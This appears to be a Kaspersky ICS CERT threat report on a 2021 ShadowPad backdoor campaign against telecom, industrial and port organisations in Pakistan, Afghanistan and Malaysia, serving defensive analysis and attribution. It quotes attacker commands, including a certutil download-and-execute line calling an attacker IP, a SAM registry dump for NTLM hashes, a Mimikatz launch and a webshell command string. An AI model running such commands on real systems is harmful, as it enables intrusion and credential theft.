Executive summary
In mid-October 2021 Kaspersky ICS CERT researchers uncovered an active ShadowPad
backdoor infection on industrial control systems (ICS) in Pakistan. Infected machines
included engineering computers in building automation systems that are part of the
infrastructure of a telecommunications company.
During the investigation researchers uncovered larger-scale activity by the threat actor in the
network of the telecommunications company and also identified other victims of the
campaign. We found malicious artifacts in organizations in the industrial and
telecommunications sectors in both Pakistan and Afghanistan. Moreover, another attack was
uncovered, using an earlier, but with very similar set of tactics, techniques and procedures
(TTPs), against a logistics and transport organization (a port) in Malaysia.

1/15

Apparently, the wave of attacks uncovered by the experts began in March 2021.
Some of the victim organizations were breached by exploiting the CVE-2021-26855
vulnerability in Microsoft Exchange.
During the investigation we found additional tools and commands used by the threat actor
after the initial infection.
From March to October 2021, the ShadowPad backdoor was downloaded to victim
computers as the mscoree.dll file, which was launched by AppLaunch.exe – a perfectly
legitimate application.
Later the attackers launched ShadowPad using DLL hijacking in a legitimate OLE-COM
object viewing application (OleView).
After the initial infection the attackers first sent commands manually, then automatically.
Other tools were also used:
The CobaltStrike framework, which was downloaded to victim machines using the
certutil.exe utility, compiled aspx web shells, and procdump and Mimikatz tools;
The PlugX backdoor;
BAT files (for stealing credentials);
Web shells (for remote access to the web server);
The Nextnet utility (for scanning network hosts).
The attackers used domains registered with NameSilo, GoDaddy.com and ENOM to
communicate with the command-and-control (C2) servers. Most of the C2 servers were
hosted on dedicated servers rented from Choopa.
The newly identified attacks on a variety of organizations had an almost totally unique set of
TTPs, which leads us to believe that the same Chinese-speaking threat actor was behind all
of these attacks.
At the time of writing, we do not know the ultimate goal of the attacker. We think it was
probably data harvesting.
We believe that it is highly likely that this threat actor will strike again and we will find new
victims in different countries.
The full report is available on the Kaspersky Threat Intelligence portal.

Initial infection
In mid-October 2021, Kaspersky ICS CERT experts discovered an active ShadowPad
backdoor that affected a number of industrial control systems in Pakistan, specifically
engineering computers in building automation systems that are part of a telecom company’s

2/15

infrastructure. A further analysis of the attack revealed other organizations affected by it –
manufacturing and telecommunications companies in Pakistan, a telecomnunications
company in Afghanistan, and a logistics and transport organization (a port) in Malaysia.
Apparently, the wave of attacks uncovered by the experts began in March 2021.
The attackers exploited a known vulnerability in MS Exchange, CVE-2021-26855, as the
initial attack vector in several victim organizations. We do not have evidence that CVE-202126855 was exploited in all cases of attack identified, but we can assume that the attackers
could use this particular vector to penetrate in other cases, as well.

ShadowPad
In the course of our investigation, we determined that in the beginning of March 2021, the
ShadowPad backdoor was downloaded on the attacked computers under the guise of the
mscoree.dll file, which was launched by the legitimate application AppLaunch.exe located in
the same folder with ShadowPad. AppLaunch.exe was executed by creating a task in the
Windows Task Scheduler.

Export table of

the mscoree.dll (ShadowPad) maliciouis DLL
In some of the cases we studied at the same time, we found that a ShadowPad sample that
had the same name and launching scheme was executed by exploiting the MS Exchange
CVE-2021-26855 vulnerability.
Since about mid-October 2021, a new ShadowPad launching scheme and a new version of
the malware has been used targeting the same organizations. Instead of using mscoree.dll,
the attackers switched to using the dll hijacking technique in legitimate software for viewing
OLE-COM objects (OleView). The legitimate OleView application downloads the malicious
IVIEWERS.dll library, which in turn downloads and executes the ShadowPad payload
contained in IVIEWERS.dll.dat.
The Windows Task Scheduler was also used for the new ShadowPad version to get a
foothold in a system. In total, we managed to find 25 unique modifications.
3/15

A more detailed analysis of some modifications of the new ShadowPad version is presented
in a recent report published by PwC.

Post-exploitation
We found that on a subset of computers (at least one in each attacked organization’s
network), some series of commands had been remotely executed via the command line
interface (cmd.exe).
At first, the attackers entered the commands manually (this is indicated by both the time
intervals between commands and the resulting output not being redirected to anything other
than standard output).
The list of commands executed by the attackers manually is shown in the original sequence
in the table below.
Command

Description

cmd.exe /C arp -a > $temp\gGjrIFGa.tmp 2>&1

output the current ARP cache
table for all interfaces to a file in
the $temp directory

quser.exe

collect information about users
authorized in the system

netstat -ano
netstat user

collect information about active
users and network connections

xcopy.exe /s $user\desktop c:\$recycle.bin\temp\■■■\

copy all files from the desktop to
the recycle.bin folder (it is worth
noting that the organization’s
domain name is also present in
the path)

ping.exe 8,8,8,8
ping.exe google.com
ping.exe 167.179.64.62

check the availability of internet
services, probably including the
attackers’ infrastructure

net use \\10.126.209.24 “■■■■■■■” /u:■■\■■■■■

mount a network drive using a
legitimate domain account

cmd.exe m1.log

launch TrojanPSW.Win32.Mimikatz

reg.exe save hklm\sam sam.hive

save registry key containing
NTLM hashes to disk

the console version of WinRar

$windir\appcompat\programs\xerice.exe
10.251.115.0/24

scan hosts on the network using
the nextnet utility (an opensource tool written in Go)

Later, the attackers began to distribute a malicious script for cmd.exe over the networks of
attacked organizations. The script was almost completely identical (in terms of its contents
and the sequence of commands) to the manual activity sequence detected earlier, but it
contained an operator to redirect the output of execution results to a file.
The script for cmd.exe that was discovered was not only delivered over the network, but was
also added by the attackers to the task scheduler for daily execution.

Example of a script designed to automate the process of collecting data on attacked
computers
It is important to note that this part of the TTPs is quite unique and we believe it supports
attributing all cases of similar activity to one Chinese-speaking group of attackers.
The artifacts found indicate that the attackers stole domain authentication credentials from at
least one account in each attacked organization (probably from the same computer that was
used to penetrate the network). These credentials were used to further spread the attack
over the network, first manually and then in automatic mode.

Additional tools
5/15

CobaltStrike
The attackers used CobaltStrike, which was downloaded to the victim’s computer using the
certutil.exe utility, compiled aspx webshells, the procdump tool, and Mimikatz.
CobaltStrike was downloaded using the following command:
"$system32\cmd.exe" /c certutil.exe -urlcache -split -f
hxxp://116.206.92[.]26:82/update.exe &amp;&amp; update.exe &amp;&amp; certutil.exe urlcache -split -f hxxp://116.206.92[.]26:82/update.exe delete

PlugX backdoor – aro.dat
In addition to the ShadowPad backdoor, activity associated with downloading aro.dat, a
variant of the PlugX backdoor, using bitsadmin was identified on the server of one of the
victims.

Downloading aro.dat backdoor
A description of the PlugX backdoor is provided in an article published by Palo Alto
Networks.

Bat file for credential theft
A bat file was found on a mail server of one of the victims, which the attackers used to collect
information and steal the NTLM hashes of accounts.

Bat file found on a victim’s server
The contents of this file are very similar to the bat file described in a VB article, which
mentions that the script was used by the Chinese group HAFNIUM.

Webshell
6/15

Malicious dll files were found on the victim’s mail servers. These are compiled .NET
Assembly files for aspx scripts used by the actor for remote access to the web server
(webshell).

Example of malicious dll webshell
The sequence of commands sent by default to the victim’s webshell was tracked earlier in
the well-known China Chopper Webshell:
"cmd" /c cd /d "C:/inetpub/wwwroot/aspnet_client"&amp;whoami&amp;echo
[S]&amp;cd&amp;echo [E]"

Infrastructure
The ShadowPad CnC servers found are mostly hosted on rented dedicated Choopa servers.

Victims
We identified malicious artifacts in organizations located in Pakistan and Afghanistan and
operating in manufacturing & telecom sectors. The attack using older TTPs and exploiting
the Microsoft Exchange vulnerability also targeted a logistics and transportation organization
(a port) in Malaysia.

Attribution
We believe with a high degree of confidence that a Chinese-speaking threat actor is behind
the activity described in this report.
There are some minor references to HAFNUIM, a Chinese-speaking threat actor, but they
are not sufficient to speak of HAFNUM’s involvement in attacks described in this report with a
high degree of confidence.
The Mimikatz utility (m1.log, SHA256:
30a78770615c6b42c17900c4ad03a9b708dc2d9b743bbdc51218597518749382),
which was identified during our investigation on computers of organizations in Pakistan,
Malaysia, and Afghanistan, was also mentioned in a Symantec report. The report also
claims that the threat actor HAFNIUM was involved in attacks exploiting a Microsoft
Exchange Server vulnerability.
In addition, a bat file for stealing NTLM hashes of accounts was found on a server of
one of the victims. The contents of the bat file found are very similar to the bat file
described in the VB article, which mentions that this script was used by HAFNIUM.
Activity related to downloading the PlugX backdoor (aro.dat), which occurred on the server of
one of the victims, was analyzed in the Palo Alto Networks report, which alleges the
involvement of a Chinese group known as PKPLUG.

Conclusion
As mentioned above, building automation systems were among the systems attacked in the
campaign described in this report. We often see accidental infections on such systems, but
they are rare targets for APT actors. Although the final goals of the attack remain unknown,

8/15

the attackers are most likely interested in gathering information. We strongly believe that
those systems themselves could be a valuable source of highly confidential information.
Additionally, we believe there is a chance that they also provide attackers with a backdoor to
other, more strictly secured, infrastructure.
The attackers’ TTPs enabled us to link these attacks to a Chinese-speaking threat actor, and
we observed victims located in different regions. This means that the actor we have identified
may have broader geographical interests and we could expect more victims to be discovered
in different countries in the future.
